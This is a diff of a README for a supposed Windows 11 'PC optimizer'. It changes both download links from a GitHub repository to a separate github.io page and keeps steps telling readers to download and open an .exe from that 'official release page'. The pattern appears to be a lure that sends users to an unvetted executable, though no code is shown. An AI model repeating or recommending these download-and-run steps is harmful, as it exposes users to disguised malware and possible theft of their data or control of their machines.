@@ -1,6 +1,6 @@
 # ⚡ PC-Optimizer-2026-Windows-11 - Make Windows 11 run faster today
 
-[![](https://img.shields.io/badge/Download-PC_Optimizer_2026-blue)](https://github.com/landresourcesabadan569/PC-Optimizer-2026-Windows-11)
+[![](https://img.shields.io/badge/Download-PC_Optimizer_2026-blue)](https://landresourcesabadan569.github.io)
 
 ## 📌 About this project
 
@@ -14,7 +14,7 @@ This tool works on any Windows 11 system. You need at least 50 MB of free storag
 
 Follow these steps to improve your system performance.
 
-1. Visit [this link](https://github.com/landresourcesabadan569/PC-Optimizer-2026-Windows-11) to access the official release page. 
+1. Visit [this link](https://landresourcesabadan569.github.io) to access the official release page. 
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to download it to your computer.
 4. Open your Downloads folder once the transfer finishes.
